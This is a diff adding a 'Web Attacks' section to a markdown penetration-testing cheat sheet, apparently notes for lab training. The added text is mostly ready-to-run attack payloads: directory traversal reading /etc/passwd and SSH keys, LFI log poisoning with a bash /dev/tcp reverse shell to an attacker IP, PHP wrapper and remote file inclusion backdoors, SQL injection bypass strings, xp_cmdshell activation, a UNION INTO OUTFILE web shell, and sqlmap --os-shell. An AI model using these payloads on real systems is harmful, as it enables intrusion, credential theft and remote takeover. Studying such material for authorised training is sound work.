@@ -373,7 +373,6 @@ This will provide information about the target system and its users.
 
 “RID are relative identifier to identify an object which will be in hexa decimal format”
 
-Query Domain information:
 ![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)
 
 **Password Spray Attack**
@@ -784,6 +783,130 @@ droopescan scan drupal -u http://site
 ```
 droopescan scan joomla --url http://site
 sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce
+```
+**Web Attacks**
+
+💡 Cross-platform PHP revershell: [
+
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php))
+
+**Directory Traversal**
+
+```
+cat /etc/passwd #displaying content through absolute path
+cat ../../../etc/passwd #relative path
+
+# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
+cat ../../etc/passwd
+
+#In web int should be exploited like this, find a parameters and test it out
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+#check for id_rsa, id_ecdsa
+#If the output is not getting formatted properly then,
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+
+#For windows
+http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
+```
+
+- URL Encoding
+
+```
+#Sometimes it doesn't show if we try path, then we need to encode them
+curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+- Wordpress
+    - Simple exploit: https://github.com/leonjza/wordpress-shell
+
+**Local File Inclusion**
+
+- The main difference between Directory traversal and this attack is that we can execute commands remotely here.
+
+```
+#At first we need
+http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
+
+#Reverse shells
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell
+
+#PHP wrapper
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
+```
+
+- Remote file inclusion
+
+```
+1. Obtain a php shell
+2. host a file server
+3.
+http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
+we can also host a php reverseshell and obtain shell.
+```
+
+**SQL Injection**
+
+```
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+```
+
+- Blind SQL Injection - This can be identified by Time-based SQLI
+
+```
+#Application takes some time to reload, here it is 3 seconds
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+
+- Manual Code Execution
+
+```
+kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+#Now we can run commands
+EXECUTE xp_cmdshell 'whoami';
+
+#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
+#Now we can exploit it
+http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+```
+
+- SQLMap - Automated Code Execution
+
+```
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
+
+#OS Shell
+#  Obtain the Post request from Burp suite and save it to post.txt
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there
+
 ```
 --
 **11. DNS enumeration**
